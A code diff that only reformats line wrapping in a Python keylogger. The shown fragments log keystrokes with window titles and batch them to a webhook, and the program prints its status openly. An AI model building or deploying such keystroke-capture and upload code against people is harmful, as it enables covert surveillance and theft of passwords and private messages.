@@ -146,9 +146,7 @@ class KeyEvent:
         Format event as human readable log line
         """
         time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
-        window = (
-            f" [{self.window_title}]" if self.window_title else ""
-        )
+        window = (f" [{self.window_title}]" if self.window_title else "")
         return f"[{time_str}]{window} {self.key}"
 
 
@@ -188,9 +186,7 @@ class WindowTracker:
     @staticmethod
     def _get_macos_window() -> str | None:
         try:
-            active = (
-                NSWorkspace.sharedWorkspace().activeApplication()
-            )
+            active = (NSWorkspace.sharedWorkspace().activeApplication())
             return active.get(
                 'NSApplicationName',
                 'Unknown',
@@ -315,8 +311,7 @@ class WebhookDelivery:
         batch: list[KeyEvent] | None = None
         with self.buffer_lock:
             self.event_buffer.append(event)
-            if (len(self.event_buffer)
-                    >= self.config.webhook_batch_size):
+            if (len(self.event_buffer) >= self.config.webhook_batch_size):
                 batch = self.event_buffer
                 self.event_buffer = []
 
@@ -398,9 +393,7 @@ class Keylogger:
         elapsed = (now - self._last_window_check).total_seconds()
 
         if (elapsed >= self.config.window_check_interval):
-            self._current_window = (
-                self.window_tracker.get_active_window()
-            )
+            self._current_window = (self.window_tracker.get_active_window())
             self._last_window_check = now
 
     def _process_key(
@@ -443,8 +436,7 @@ class Keylogger:
 
         key_str, key_type = self._process_key(key)
 
-        if (key_type == KeyType.SPECIAL
-                and not self.config.log_special_keys):
+        if (key_type == KeyType.SPECIAL and not self.config.log_special_keys):
             return
 
         event = KeyEvent(
@@ -465,33 +457,25 @@ class Keylogger:
 
         if self.is_logging.is_set():
             self.is_logging.clear()
-            print(
-                f"\n[*] Logging paused. "
-                f"Press {toggle} to resume."
-            )
+            print(f"\n[*] Logging paused. "
+                  f"Press {toggle} to resume.")
         else:
             self.is_logging.set()
-            print(
-                f"\n[*] Logging resumed. "
-                f"Press {toggle} to pause."
-            )
+            print(f"\n[*] Logging resumed. "
+                  f"Press {toggle} to pause.")
 
     def start(self) -> None:
         """
         Start the keylogger
         """
         toggle = (self.config.toggle_key.name.upper())
-        webhook_status = (
-            "Enabled" if self.webhook.enabled else "Disabled"
-        )
+        webhook_status = ("Enabled" if self.webhook.enabled else "Disabled")
 
         print("Keylogger Started")
         print()
         print(f"Log Directory: {self.config.log_dir}")
-        print(
-            "Current Log: "
-            f"{self.log_manager.current_log_path.name}"
-        )
+        print("Current Log: "
+              f"{self.log_manager.current_log_path.name}")
         print(f"Toggle Key: {toggle}")
         print(f"Webhook: {webhook_status}")
         print()
@@ -507,9 +491,7 @@ class Keylogger:
 
         try:
             while self.is_running.is_set():
-                self.listener.join(
-                    timeout = (LISTENER_JOIN_TIMEOUT_SECS)
-                )
+                self.listener.join(timeout = (LISTENER_JOIN_TIMEOUT_SECS))
         except KeyboardInterrupt:
             self.stop()
 
